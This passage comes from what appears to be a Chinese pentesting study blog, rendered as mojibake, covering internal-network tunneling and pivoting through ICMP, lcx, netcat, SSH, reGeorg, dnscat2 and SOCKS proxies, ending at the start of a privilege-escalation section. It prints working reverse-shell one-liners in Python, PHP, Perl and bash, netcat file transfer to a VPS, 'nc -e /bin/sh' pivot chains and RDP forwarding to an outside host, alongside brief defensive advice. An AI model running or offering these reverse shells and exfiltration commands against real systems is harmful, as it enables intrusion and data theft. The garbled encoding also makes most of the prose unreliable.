net.ipv4.icmp_echo_ignore_all=1</code>ï¼ˆå¼€å¯è®¾ç½®ä¸º0ï¼‰</li></ul></li><li><p><code>PingTunnel</code>ï¼šé…ç½®èµ·æ¥æ¯”è¾ƒéº»çƒ¦ï¼Œéœ€è¦å®‰è£…å¾ˆå¤šç¯å¢ƒ</p></li><li><p><code>icmptunnel</code></p></li><li><p><code>powershell icmp</code></p></li></ol><p><strong>é˜²å¾¡æ–¹æ³•</strong></p><ul><li>æ£€æµ‹åŒä¸€æ¥æºçš„æ•°æ®åŒ…çš„æ•°é‡</li><li>æ³¨æ„Payloadå¤§äº64bitçš„ICMPæ•°æ®åŒ…</li><li>å¯»æ‰¾å“åº”æ•°æ®åŒ…ä¸­çš„payloadä¸è¯·æ±‚æ•°æ®åŒ…ä¸­çš„payloadä¸ä¸€è‡´çš„ICMPæ•°æ®åŒ…</li><li>æ£€æŸ¥ICMPæ•°æ®åŒ…çš„åè®®æ ‡ç­¾ï¼Œä¾‹å¦‚<code>icmptunnel</code>ä¼šåœ¨æ‰€æœ‰çš„ICMP payloadå‰é¢æ·»åŠ ä¸€ä¸ªTUNLæ ‡è®°æ¥æ ‡è¯†éš§é“</li></ul><h5 id="ä¼ è¾“å±‚éš§é“æŠ€æœ¯"><a href="#ä¼ è¾“å±‚éš§é“æŠ€æœ¯" class="headerlink" title="ä¼ è¾“å±‚éš§é“æŠ€æœ¯"></a>ä¼ è¾“å±‚éš§é“æŠ€æœ¯</h5><p>ä¼ è¾“å±‚æŠ€æœ¯åŒ…æ‹¬TCPéš§é“ï¼ŒUDPéš§é“å’Œå¸¸è§„çš„ç«¯å£è½¬å‘ã€‚</p><h6 id="lcxç«¯å£è½¬å‘"><a href="#lcxç«¯å£è½¬å‘" class="headerlink" title="lcxç«¯å£è½¬å‘"></a><strong>lcxç«¯å£è½¬å‘</strong></h6><p>lcxæ˜¯ä¸€ä¸ªåŸºäºSocketå¥—æ¥å­—å®ç°çš„ç«¯å£è½¬å‘å·¥å…·ï¼Œæœ‰Windowsï¼ˆlcx.exeï¼‰å’ŒLinuxï¼ˆportmapï¼‰ä¸¤ä¸ªç‰ˆæœ¬ï¼Œä¸€ä¸ªæ­£å¸¸çš„Socketéš§é“å¿…é¡»å…·å¤‡ä¸¤ç«¯ï¼šä¸€ç«¯ä¸ºæœåŠ¡ç«¯ï¼Œç›‘å¬ä¸€ä¸ªç«¯å£ï¼Œç­‰å¾…å®¢æˆ·ç«¯çš„è¿æ¥ï¼›å¦ä¸€ç«¯ä¸ºå®¢æˆ·ç«¯ï¼Œé€šè¿‡ä¼ å…¥æœåŠ¡ç«¯çš„IPå’Œç«¯å£æ‰èƒ½ä¸»åŠ¨ä¸æœåŠ¡å™¨è¿æ¥</p><p>ä¸‹è½½ï¼š<a href="https://github.com/UndefinedIdentifier/LCX">https://github.com/UndefinedIdentifier/LCX</a></p><p><strong>å†…ç½‘ç«¯å£è½¬å‘</strong></p><p>åœ¨ç›®æ ‡ä¸»æœºä¸Šæ‰§è¡Œå‘½ä»¤ï¼Œå°†ç›®æ ‡æœºå™¨çš„3389ç«¯å£çš„æ‰€æœ‰æ•°æ®è½¬å‘åˆ°å…¬ç½‘VPSçš„4444ç«¯å£ä¸Š<code>lcx.exe -slave &lt;å…¬ç½‘IP&gt; 4444 127.0.0.1 3389</code></p><p>åœ¨VPSä¸Šæ‰§è¡Œå‘½ä»¤ï¼Œå°†æœ¬åœ°4444ç«¯å£ä¸Šç›‘å¬çš„æ‰€æœ‰æ•°æ®è½¬å‘åˆ°æœ¬æœºçš„5555ç«¯å£ä¸Š<code>lcx.exe -listen 4444 5555</code></p><p>åˆ©ç”¨mstscç™»å½•è¿œç¨‹æ¡Œé¢&lt;å…¬ç½‘IP&gt;:5555 æˆ–è€…åœ¨VPSä¸Šç›´æ¥è¿æ¥è¿œç¨‹æ¡Œé¢127.0.0.1:5555</p><p><strong>æœ¬åœ°ç«¯å£æ˜ å°„</strong></p><p>å¦‚æœç›®æ ‡æœåŠ¡å™¨ç”±äºé˜²ç«å¢™çš„é™åˆ¶ï¼Œéƒ¨åˆ†ç«¯å£æ— æ³•é€šè¿‡é˜²ç«å¢™ï¼Œå¯ä»¥å°†ç›®æ ‡æœåŠ¡å™¨çš„ç›¸åº”ç«¯å£çš„æ•°æ®ä¼ åˆ°é˜²ç«å¢™å…è®¸çš„å…¶ä»–ç«¯å£ï¼ˆä¾‹å¦‚53ï¼‰<code>lcx -tran 53 &lt;ç›®æ ‡ä¸»æœºIPåœ°å€&gt; 3389</code></p><h6 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a><strong>netcat</strong></h6><p><strong>ç®€å•ä½¿ç”¨</strong></p><ul><li><p>æŠ“å–Bannerä¿¡æ¯<code>nc -nv 192.168.123.123 21</code> æŠ“å–ç›®æ ‡ä¸»æœº21ç«¯å£çš„Bannerä¿¡æ¯</p></li><li><p>è¿œç¨‹è¿æ¥ä¸»æœº<code>nc -nvv 192.168.123.123 80</code></p></li><li><p>ç«¯å£æ‰«æ<code>nc -v 192.168.123.123 80</code>  <code>nc -v -z 192.168.123.123 20-1024</code>ï¼ˆæ‰«æç«¯å£æ®µé€Ÿåº¦è¾ƒæ…¢ï¼‰</p></li><li><p>ç«¯å£ç›‘å¬<code>nc -l -p 9999</code> ç›‘å¬æœ¬åœ°ç«¯å£ï¼Œè®¿é—®è¯¥ç«¯å£æ—¶ä¼šè¾“å‡ºè¯¥ä¿¡æ¯åˆ°å‘½ä»¤è¡Œ</p></li><li><p>æ–‡ä»¶ä¼ è¾“vpsè¾“å…¥<code>nc -lp 333 &gt; 1.txt</code> ç›®æ ‡ä¸»æœºè¾“å…¥<code>nc -vn 192.168.1.4 333 &lt; test.txt -q 1</code>ä¸€æ—¦è¿æ¥å»ºç«‹ï¼Œæ•°æ®ä¾¿ä¼šæµå…¥</p></li><li><p>è·å–shell</p><ul><li><p>å®¢æˆ·ç«¯è¿æ¥æœåŠ¡å™¨ï¼Œå®¢æˆ·ç«¯è·å–æœåŠ¡å™¨shellè¿™ç§ç§°ä¸ºæ­£å‘shell</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210730113202468.png" alt="image-20210730113202468"></p></li><li><p>å®¢æˆ·ç«¯è¿æ¥æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨è·å–å®¢æˆ·ç«¯shellè¿™ç§ç§°ä¸ºåå‘shellï¼Œåå‘shellé€šå¸¸ç”¨åœ¨å¼€å¯é˜²ç«æªæ–½çš„ç›®æ ‡ä¸»æœºä¸Š</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210730113725281.png" alt="image-20210730113725281"></p></li><li><p>ç›®æ ‡ä¸»æœºæ²¡æœ‰ncæ—¶è·å–åå‘shell</p><ul><li><p>pythonåå‘shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&#x27;import socket,subprocess,os; \</span><br><span class="hljs-string">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);</span><br><span class="hljs-string">s.connect((&quot;192.168.1.4&quot;,2222));</span><br><span class="hljs-string">os.dup2(s.fileno(),0);</span><br><span class="hljs-string">os.dup2(s.fileno(),1);</span><br><span class="hljs-string">os.dup2(s.fileno(),2);</span><br><span class="hljs-string">p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></code></pre></td></tr></table></figure></li><li><p>PHPåå‘shell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">php -r <span class="hljs-string">&#x27;$sock=fsockopen(&quot;192.168.1.4&quot;,2222);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></code></pre></td></tr></table></figure></li><li><p>Perlåå‘shell</p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tcl">perl -e &#x27;use Socket;$i=<span class="hljs-string">&quot;192.168.1.4&quot;</span>;$p=<span class="hljs-number">4444</span>;<span class="hljs-keyword">socket</span>(S,PF_INET,SOCK_STREAM,getprotobyname(<span class="hljs-string">&quot;tcp&quot;</span>)),<span class="hljs-keyword">if</span>(connect(S,sockaddr_in($p,inet_aton($i))))&#123;<span class="hljs-keyword">open</span>(STDIN,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>);<span class="hljs-keyword">open</span>(STDOUT,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>);<span class="hljs-keyword">open</span>(STDERR,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>);<span class="hljs-keyword">exec</span>(<span class="hljs-string">&quot;/bin/sh -i&quot;</span>);&#125;;&#x27;<br></code></pre></td></tr></table></figure></li><li><p>bashåå‘shell <code>bash -i &gt;&amp; /dev/tcp/192.168.1.4/4444 0&gt;&amp;1</code></p></li></ul></li></ul></li><li><p>å†…ç½‘ä»£ç†</p><p>å‡è®¾é™åˆ¶è·å–åˆ°äº†WebæœåŠ¡å™¨çš„æƒé™ï¼Œé€šè¿‡Kaliä¸èƒ½è®¿é—®åˆ°æ•°æ®åº“æœåŠ¡å™¨ï¼ŒwebæœåŠ¡å™¨å¯ä»¥è®¿é—®æ•°æ®åº“æœåŠ¡å™¨ã€‚ä½¿ç”¨netcaté€šè¿‡webæœåŠ¡å™¨ä»£ç†ä½¿kaliè·å–åˆ°æ•°æ®åº“æœåŠ¡å™¨çš„shell</p><p>kaliï¼š<code>nc -lvp 9999</code></p><p>æ•°æ®åº“æœåŠ¡å™¨ï¼š<code>nc -lvp 9999 -e /bin/sh</code></p><p>webæœåŠ¡å™¨ï¼š<code>nc -v kali-ip 9999 -c &quot;nc -v æ•°æ®åº“-ip 9999&quot;</code></p></li></ul><h6 id="PowerCat"><a href="#PowerCat" class="headerlink" title="PowerCat"></a><strong>PowerCat</strong></h6><p>PowerCatå¯ä»¥è¯´æ˜¯ncçš„powershelç‰ˆï¼Œå®ƒå¯ä»¥é€šè¿‡æ‰§è¡Œå‘½ä»¤å›åˆ°æœ¬åœ°è¿è¡Œï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨è¿œç¨‹æƒé™è¿è¡Œï¼Œå…·ä½“ä½¿ç”¨æ–¹æ³•æ‰“åˆ°é¶åœºå†æ¥æ€»ç»“</p><h5 id="åº”ç”¨å±‚éš§é“æŠ€æœ¯"><a href="#åº”ç”¨å±‚éš§é“æŠ€æœ¯" class="headerlink" title="åº”ç”¨å±‚éš§é“æŠ€æœ¯"></a><strong>åº”ç”¨å±‚éš§é“æŠ€æœ¯</strong></h5><h6 id="SSHåè®®"><a href="#SSHåè®®" class="headerlink" title="SSHåè®®"></a><strong>SSHåè®®</strong></h6><p>å†…ç½‘ä¸­Linux/UNIXæœåŠ¡å™¨å’Œç½‘ç»œè®¾å¤‡éƒ½æ”¯æŒSSHåè®®ï¼Œä¸€èˆ¬æƒ…å†µä¸‹SSHåè®®æ˜¯è¢«å…è®¸é€šè¿‡é˜²ç«å¢™å’Œè¾¹ç•Œè®¾å¤‡çš„ã€‚SSHåè®®çš„ä¼ è¾“è¿‡ç¨‹</p><p> <img src="https://gitee.com/lcdm123/image/raw/master/image-20210730125530065.png" alt="image-20210730125530065"></p><p><strong>æœ¬åœ°è½¬å‘</strong></p><p>webæœåŠ¡å™¨å¯ä»¥è®¿é—®æ•°æ®åº“æœåŠ¡å™¨ï¼Œvpså¯ä»¥è®¿é—®webæœåŠ¡å™¨ï¼Œvpsä¸èƒ½è®¿é—®æ•°æ®åº“  ï¼Œä»¥webæœåŠ¡å™¨ä¸ºè·³æ¿æœºå°†æ•°æ®åº“æœåŠ¡å™¨çš„ç«¯å£æ˜ å°„åˆ°vpsçš„ç«¯å£ä¸Š</p><p><code>ssh -CfNg -L vps-port:æ•°æ®åº“æœåŠ¡å™¨-ip:æ•°æ®åº“æœåŠ¡å™¨port root@192.168.1.103</code></p><p>SSHè¿›ç¨‹çš„æœ¬åœ°ç«¯å£æ˜ å°„å¯ä»¥å°†æœ¬åœ°çš„æŸä¸ªç«¯å£è½¬å‘åˆ°è¿œç¨‹æŒ‡å®šçš„æœºå™¨çš„æŒ‡å®šç«¯å£ï¼›æœ¬åœ°ç«¯å£è½¬å‘åˆ™æ˜¯åœ¨æœ¬åœ°ç›‘å¬ä¸€ä¸ªç«¯å£ï¼Œæ‰€æœ‰è®¿é—®è¿™ä¸ªç«¯å£çš„æ•°æ®éƒ½ä¼šé€šè¿‡SSHéš§é“ä¼ è¾“åˆ°è¿œç«¯çš„å¯¹åº”ç«¯å£</p><p><strong>è¿œç¨‹è½¬å‘</strong></p><p><code>ssh -CfNg -R vps-port:æ•°æ®åº“æœåŠ¡å™¨-ip:æ•°æ®åº“æœåŠ¡å™¨port root@192.168.1.103</code></p><p><strong>æœ¬åœ°è½¬å‘</strong>æ˜¯å°†<strong>è¿œç¨‹ä¸»æœº</strong>ï¼ˆæœåŠ¡å™¨ï¼‰æŸä¸ªç«¯å£çš„<strong>æ•°æ®è½¬å‘</strong>åˆ°<strong>æœ¬åœ°æœºå™¨çš„æŒ‡å®šç«¯å£</strong>ã€‚<strong>è¿œç¨‹ç«¯å£è½¬å‘</strong>åˆ™æ˜¯åœ¨<strong>è¿œç¨‹ä¸»æœºä¸Šç›‘å¬ä¸€ä¸ªç«¯å£</strong>ï¼Œæ‰€æœ‰<strong>è®¿é—®è¿œç¨‹æœåŠ¡å™¨æŒ‡å®šç«¯å£çš„æ•°æ®</strong>éƒ½ä¼šé€šè¿‡<strong>SSHéš§é“ä¼ è¾“åˆ°æœ¬åœ°å¯¹åº”ç«¯å£</strong>ã€‚</p><p><strong>åŠ¨æ€è½¬å‘</strong></p><p>é¦–å…ˆåœ¨vpsä¸Šæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤å»ºç«‹ä¸€ä¸ªåŠ¨æ€çš„SOCKS 4/5ä»£ç†é€šé“<code>ssh -CfNg -D 7000 root@192.168.1.103</code>ï¼Œåœ¨æœ¬åœ°æµè§ˆå™¨è®¾ç½®ç½‘ç»œä»£ç†ï¼Œé€šè¿‡æµè§ˆå™¨è®¿é—®å†…ç½‘</p><p><strong>é˜²å¾¡æªæ–½</strong></p><p>SSHéš§é“è¢«æ”»å‡»ä¸»è¦æ˜¯å› ä¸ºç³»ç»Ÿè®¿é—®æ§åˆ¶æªæ–½ä¸å¤Ÿï¼Œåœ¨ç³»ç»Ÿä¸­é…ç½®SSHè¿œç¨‹ç®¡ç†ç™½åå•ï¼Œåœ¨ACLä¸­é™åˆ¶åªæœ‰ç‰¹å®šçš„IPåœ°å€æ‰èƒ½è¿æ¥SSHï¼Œä»¥åŠè®¾ç½®ç³»ç»Ÿå®Œå…¨ä½¿ç”¨å¸¦å¤–ç®¡ç†ç­‰æ–¹æ³•æ¥é¿å…è¿™ä¸€é—®é¢˜ã€‚åœ¨å†…ç½‘ä¸­è‡³å°‘è¦é™åˆ¶sshè¿œç¨‹ç™»å½•çš„åœ°å€å’ŒåŒå‘è®¿é—®æ§åˆ¶ç­–ç•¥</p><h6 id="HTTP-HTTPSåè®®"><a href="#HTTP-HTTPSåè®®" class="headerlink" title="HTTP/HTTPSåè®®"></a><strong>HTTP/HTTPSåè®®</strong></h6><p>HTTP Serviceä»£ç†ç”¨äºå°†æ‰€æœ‰çš„æµé‡è½¬å‘åˆ°å†…ç½‘ï¼Œå¸¸è§çš„ä»£ç†å·¥å…·æœ‰reGeorgï¼Œmeterpreterï¼Œtunnaç­‰</p><p>reGeorgæ˜¯reDuhçš„å‡çº§ç‰ˆï¼Œä¸»è¦åŠŸèƒ½å°±æ˜¯æŠŠå†…ç½‘æœåŠ¡å™¨ç«¯å£çš„æ•°æ®é€šè¿‡HTTPã€HTTPSéš§é“è½¬å‘åˆ°æœ¬æœºï¼Œå®ç°åŸºäºHTTPåè®®çš„é€šä¿¡ã€‚å…¶è„šæœ¬ç‰¹å¾æ˜æ˜¾ï¼Œå¾ˆå¤šæ€è½¯éƒ½ä¼šå¯¹å…¶è¿›è¡ŒæŸ¥æ€ã€‚</p><p>ä¸‹è½½ï¼š<a href="https://github.com/sensepost/reGeorg">https://github.com/sensepost/reGeorg</a></p><p>ä½¿ç”¨:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">python reGeorgSocksProxy.py -u http:<span class="hljs-regexp">//i</span>p:port/tunnel.jsp -p <span class="hljs-number">9999</span> å¼€å¯éš§é“ç«¯å£<br>éš§é“æ­£å¸¸å·¥ä½œååœ¨kaliä¸Šä½¿ç”¨ ProxyChainsä¹‹ç±»çš„å·¥å…·ï¼Œè®¿é—®ç›®æ ‡å†…ç½‘<br></code></pre></td></tr></table></figure><h6 id="DNSåè®®"><a href="#DNSåè®®" class="headerlink" title="DNSåè®®"></a><strong>DNSåè®®</strong></h6><p>ç”¨äºç®¡ç†åƒµå°¸ç½‘ç»œå’Œè¿›è¡ŒAPTæ”»å‡»çš„æœåŠ¡å™¨å«åšC&amp;CæœåŠ¡å™¨ï¼ŒC&amp;CèŠ‚ç‚¹åˆ†ä¸ºä¸¤ç§ï¼Œåˆ†åˆ«æ˜¯æœåŠ¡ç«¯ï¼ˆæ”»å‡»è€…ï¼‰å’Œå®¢æˆ·ç«¯ï¼ˆè¢«æ§åˆ¶çš„è®¡ç®—æœºï¼‰ã€‚C&amp;Cé€šä¿¡æ˜¯æŒ‡æ¤å…¥C&amp;Cå®¢æˆ·ç«¯çš„æœ¨é©¬æˆ–è€…åé—¨ç¨‹åºä¸C&amp;CæœåŠ¡ç«¯ä¸Šçš„è¿œç¨‹æ§åˆ¶ç¨‹åºä¹‹é—´çš„é€šä¿¡ã€‚</p><p>DNSéš§é“çš„å·¥ä½œåŸç†ï¼šåœ¨è¿›è¡ŒDNSæŸ¥è¯¢çš„æ—¶å€™ï¼Œå¦‚æœæŸ¥è¯¢çš„åŸŸåä¸åœ¨DNSæœåŠ¡å™¨æœ¬æœºä¸Šçš„ç¼“å­˜ä¸­ï¼Œå°±ä¼šè®¿é—®äº’è”ç½‘è¿›è¡ŒæŸ¥è¯¢ï¼Œç„¶åè¿”å›ç»“æœã€‚å¦‚æœåœ¨äº’è”ç½‘ä¸Šæœ‰ä¸€å°å®šåˆ¶çš„æœåŠ¡å™¨ï¼Œé‚£ä¹ˆä¾é DNSåè®®å³å¯è¿›è¡Œæ•°æ®åŒ…çš„äº¤æ¢ã€‚ä»DNSåè®®è§’åº¦çœ‹ ï¼Œè¿™æ ·çš„æ“ä½œåªæ˜¯ä¸€æ¬¡æ¬¡åœ°æŸ¥è¯¢æŸä¸ªç‰¹å®šçš„åŸŸåå¹¶ä¸”å¾—åˆ°è§£æç»“æœï¼Œä½†å…¶æœ¬è´¨é—®é¢˜æ˜¯ï¼Œ<strong>é¢„æœŸçš„è¿”å›ç»“æœåº”è¯¥æ˜¯ä¸€ä¸ªIPï¼Œè€Œäº‹å®ä¸Šè¿”å›çš„ç»“æœå¯ä»¥æ˜¯ä»»æ„å­—ç¬¦ä¸²</strong>ï¼ˆä¾‹å¦‚åŠ å¯†çš„C&amp;CæŒ‡ä»¤ï¼‰</p><p>DNSéš§é“ä¸å¤–éƒ¨é€šä¿¡æ—¶ï¼Œè¡¨é¢ä¸Šæ²¡æœ‰è¿æ¥å¤–ç½‘ï¼ˆå†…ç½‘ç½‘å…³æ²¡æœ‰è½¬å‘IPæ•°æ®åŒ…ï¼‰ï¼Œä½†å®é™…ä¸Šå†…ç½‘çš„DNSæœåŠ¡å™¨è¿›è¡Œäº†ä¸­è½¬æ“ä½œã€‚å°†å…¶ä»–åè®®å°è£…åœ¨DNSåè®®ä¸­è¿›è¡Œä¼ è¾“ã€‚</p><p><strong>æŸ¥çœ‹DNSè¿é€šæ€§</strong></p><p>é¦–å…ˆæˆ‘ä»¬éœ€è¦æ‰¾åˆ°å½“å‰æœåŠ¡å™¨æ˜¯å¦å…è®¸é€šè¿‡å†…éƒ¨DNSè§£æå¤–éƒ¨åŸŸå</p><p>æŸ¥çœ‹å½“å‰å†…éƒ¨åŸŸåä»¥åŠIPï¼š<code>cat /etc/resolv.conf | grep -v &#39;#&#39;</code></p><p>æŸ¥çœ‹æ˜¯å¦ä¸å†…éƒ¨DNSé€šä¿¡ï¼š<code>nslookup lcdm123.com</code></p><p>æŸ¥è¯¢æ˜¯å¦å¯ä»¥é€šè¿‡å†…éƒ¨DNSæœåŠ¡å™¨è§£æå¤–éƒ¨åŸŸåï¼š<code>nslookup baidu.com</code></p><p><strong>dnscat2</strong></p><p>dnscat2æ—¶ä¸€æ¬¾å¼€æºè½¯ä»¶ï¼Œå®ƒä½¿ç”¨DNSåè®®åˆ›å»ºåŠ å¯†çš„C&amp;Cé€šé“ï¼Œé€šè¿‡é¢„å…±äº«å¯†é’¥è¿›è¡Œèº«ä»½éªŒè¯ã€‚å®ƒçš„å®¢æˆ·ç«¯æ˜¯ç”¨Cè¯­è¨€ç¼–å†™ï¼ŒæœåŠ¡ç«¯æ˜¯ç”¨Rubyè¯­è¨€ç¼–å†™ã€‚</p><p>dnscat2éš§é“æ¨¡å¼æœ‰ä¸¤ç§ï¼š</p><ul><li>ç›´è¿æ¨¡å¼ï¼šå®¢æˆ·ç«¯ç›´æ¥å‘æŒ‡å®šIPåœ°å€çš„DNSæœåŠ¡å™¨å‘èµ·DNSè§£æè¯·æ±‚</li><li>ä¸­ç»§æ¨¡å¼ï¼šDNSç»è¿‡äº’è”ç½‘çš„è¿­ä»£è§£æï¼ŒæŒ‡å‘æŒ‡å®šçš„DNSæœåŠ¡å™¨ã€‚ä¸ç›´è¿æ¨¡å¼ç›¸æ¯”ï¼Œè¿™ç§æ¯”è¾ƒæ…¢</li></ul><p>DNSéš§é“åº”ç”¨åœºæ™¯ï¼šåœ¨å®‰å…¨ç­–ç•¥ä¸¥æ ¼çš„å†…ç½‘ç¯å¢ƒä¸­ï¼Œå¸¸è§çš„C&amp;Cé€šä¿¡ç«¯å£ä¼šè¢«ä¼—å¤šå®‰å…¨è®¾å¤‡ç›‘æ§ï¼Œè¯¥ç½‘æ®µåªå…è®¸ç™½åå•æµé‡å‡ºç«™ï¼ŒåŒæ—¶å…¶ä»–ç«¯å£éƒ½è¢«å±è”½äº†ï¼Œä¼ ç»Ÿçš„C&amp;Cé€šä¿¡æ— æ³•å»ºç«‹ã€‚</p><p>å·¥å…·ï¼š</p><ul><li><p>dnscat2</p><p>ä¸‹è½½ï¼š<a href="https://github.com/iagox86/dnscat2">https://github.com/iagox86/dnscat2</a>   </p><p>â€‹            <a href="https://downloads.skullsecurity.org/dnscat2/">https://downloads.skullsecurity.org/dnscat2/</a>   </p><p>â€‹            <a href="https://github.com/lukebaggett/dnscat2-powershell">https://github.com/lukebaggett/dnscat2-powershell</a></p></li><li><p>iodine</p></li></ul><p><strong>é˜²å¾¡DNSéš§é“æ”»å‡»</strong></p><ol><li>ç¦æ­¢ä»»ä½•äººå‘å¤–éƒ¨æœåŠ¡å™¨å‘é€DNSè¯·æ±‚ï¼Œåªå…è®¸ä¸å—ä¿¡ä»»çš„DNSæœåŠ¡å™¨é€šä¿¡</li><li>è¿½è¸ªç”¨æˆ·çš„DNSæŸ¥è¯¢æ¬¡æ•°ï¼Œè®¾ç½®é˜ˆå€¼</li><li>é˜»æ­¢ICMP</li><li>å°†é‚®ä»¶æœåŠ¡å™¨ã€ç½‘å…³åˆ—å…¥ç™½åå•å¹¶é˜»æ­¢ä¼ å…¥å’Œä¼ å‡ºæµé‡ä¸­çš„TXTè¯·æ±‚</li></ol><h5 id="SOCKSä»£ç†"><a href="#SOCKSä»£ç†" class="headerlink" title="SOCKSä»£ç†"></a>SOCKSä»£ç†</h5><p>å¸¸è§çš„ç½‘ç»œç¯å¢ƒ</p><ul><li>æœåŠ¡å™¨åœ¨å†…ç½‘ä¸­ï¼Œå¯ä»¥ä»»æ„è®¿é—®å¤–éƒ¨ç½‘ç»œ</li><li>æœåŠ¡å™¨åœ¨å†…ç½‘ä¸­ï¼Œå¯ä»¥è®¿é—®å¤–éƒ¨ç½‘ç»œä½†æ˜¯æœåŠ¡å™¨å®‰è£…äº†é˜²ç«å¢™æ¥æ‹’ç»æ•æ„Ÿç«¯å£çš„è¿æ¥</li><li>æœåŠ¡å™¨åœ¨å†…ç½‘ä¸­ï¼Œå¯¹å¤–åªå¼€æ”¾äº†éƒ¨åˆ†ç«¯å£ï¼Œå¹¶ä¸”æœåŠ¡å™¨ä¸èƒ½è®¿é—®å¤–éƒ¨ç½‘ç»œ</li></ul><p>å¸¸ç”¨çš„Socksä»£ç†å·¥å…·</p><ul><li><p><code>EarthWorm</code></p><p>ä½“ç§¯å°ï¼Œä½¿ç”¨æ—¶ä¸éœ€è¦è¿›è¡Œå…¶ä»–è®¾ç½®</p><p>ä¸‹è½½ï¼š<a href="https://github.com/rootkiter/EarthWorm">https://github.com/rootkiter/EarthWorm</a></p></li><li><p><code>reGeorg</code></p><p>ä¸Šé¢HTTPéš§é“æ—¶ä»‹ç»è¿‡ï¼Œå®ƒåˆ©ç”¨webshellå»ºç«‹Socksä»£ç†è¿›è¡Œå†…ç½‘ç©¿é€ï¼ŒæœåŠ¡å™¨å¿…é¡»æ”¯æŒASPXï¼ŒPHPï¼ŒJSPä¸­çš„ä¸€ç§</p></li><li><p><code>sSocks</code></p></li><li><p><code>SocksCap64</code></p><p>Windowsä¸­å¾ˆå¥½ç”¨çš„ä¸€æ¬¾å…¨å±€ä»£ç†è½¯ä»¶ï¼Œæ“ä½œæ–¹ä¾¿</p><p>ä¸‹è½½ï¼š<a href="https://www.sockscap64.com/sockscap-64-free-download-zh-hans/">https://www.sockscap64.com/sockscap-64-free-download-zh-hans/</a></p></li><li><p><code>Proxifier</code></p><p>æä¾›äº†è·¨å¹³å°çš„ç«¯å£è½¬å‘å’Œä»£ç†åŠŸèƒ½ï¼Œé€‚ç”¨äºWindowsï¼ŒLinuxï¼ŒMacOS</p><p>ä¸‹è½½ï¼š<a href="https://www.proxifier.com/">https://www.proxifier.com/</a></p></li><li><p><code>ProxyChains</code></p><p>åœ¨Linuxä¸‹å®ç°å…¨å±€ä»£ç†çš„è½¯ä»¶ï¼Œå¯ä»¥ä½¿ä»»ä½•ç¨‹åºé€šè¿‡ä»£ç†ä¸Šç½‘ï¼Œå…è®¸TCPå’ŒDNSæµé‡é€šè¿‡ä»£ç†éš§é“ï¼Œæ”¯æŒHTTPï¼ŒSOCKS 4 ï¼ŒSOCKS 5ç±»å‹çš„ä»£ç†æœåŠ¡å™¨</p></li></ul><h5 id="ä¸Šä¼ å’Œä¸‹è½½"><a href="#ä¸Šä¼ å’Œä¸‹è½½" class="headerlink" title="ä¸Šä¼ å’Œä¸‹è½½"></a><strong>ä¸Šä¼ å’Œä¸‹è½½</strong></h5><ul><li><p>åˆ©ç”¨FTPåè®®ä¸Šä¼ </p></li><li><p>åˆ©ç”¨VBSä¸Šä¼ </p></li><li><p>åˆ©ç”¨Debugä¸Šä¼ </p><p>å°†.exeæ–‡ä»¶è½¬æ¢ä¸ºHEXçš„å½¢å¼ï¼Œç„¶åé€šè¿‡echoå‘½ä»¤å°†HEXä»£ç å†™å…¥æ–‡ä»¶ï¼Œæœ€ååˆ©ç”¨DebugåŠŸèƒ½å°†HEXä»£ç ç¼–è¯‘å¹¶è¿˜åŸä¸º.exeæ–‡ä»¶</p></li><li><p>ä½¿ç”¨<code>Nishang</code>ä¸Šä¼ </p></li><li><p>åˆ©ç”¨<code>bitsadmin</code>ä¸‹è½½ï¼ˆæ¨èåœ¨windows7 å’Œ 8 ä¸Šä½¿ç”¨ï¼‰</p></li><li><p>åˆ©ç”¨<code>powershell</code>ä¸‹è½½</p></li></ul><h4 id="æƒé™æå‡"><a href="#æƒé™æå‡" class="headerlink" title="æƒé™æå‡"></a>æƒé™æå‡</h4><p>Windowsçš„å››ç§æƒé™</p><ol><li><code>User</code>ï¼šæ™®é€šç”¨æˆ·æƒé™</li><li><code>Administrator</code>ï¼šç®¡ç†å‘˜æƒé™ï¼Œå¯ä»¥åˆ©ç”¨windowsçš„æœºåˆ¶å°†è‡ªå·±æå‡ä¸ºSystemæƒé™ï¼Œä»¥ä¾¿æ“ä½œSAMæ–‡ä»¶ç­‰</li><li><code>System</code>ï¼šç³»ç»Ÿæƒé™ï¼Œå¯ä»¥å¯¹SAMç­‰æ•æ„Ÿæ–‡ä»¶è¿›è¡Œè¯»å–ï¼Œå¾€å¾€éœ€è¦å°†Administratoræƒé™æå‡åˆ°Systemæƒé™æ‰å¯ä»¥å¯¹æ•£åˆ—å€¼è¿›è¡ŒDumpæ“ä½œ</li><li><code>TrustedInstaller</code>ï¼šWindowsä¸­çš„æœ€é«˜æƒé™ï¼Œèƒ½å¤Ÿä¿®æ”¹ç³»ç»Ÿæ–‡ä»¶</li></ol><p><strong>çºµå‘ææƒ</strong>ï¼šä½æƒé™è§’è‰²è·å¾—é«˜æƒé™è§’è‰²çš„æƒé™ã€‚</p><p><strong>æ¨ªå‘ææƒ</strong>ï¼šè·å¾—åŒçº§åˆ«è§’è‰²çš„æƒé™ã€‚ä¾‹å¦‚ï¼šåœ¨ç³»ç»ŸAä¸­è·å–äº†ç³»ç»ŸBçš„æƒé™</p><p><strong>å¸¸ç”¨çš„ææƒæ–¹æ³•</strong>ï¼šç³»ç»Ÿå†…æ 